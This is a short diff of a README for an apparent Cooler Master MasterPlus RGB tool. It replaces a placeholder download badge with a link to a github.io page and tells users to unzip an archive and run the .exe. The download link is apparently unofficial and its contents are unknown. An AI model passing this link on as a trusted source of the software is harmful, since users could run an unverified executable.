@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://cooler-master-masterplus.github.io/.github/)
 
 ## 📸 Overview
 ![coolermaster-masterplus-rgb](https://github.com/user-attachments/assets/27e663f1-6430-4b02-923d-8d871b8fe7d2)
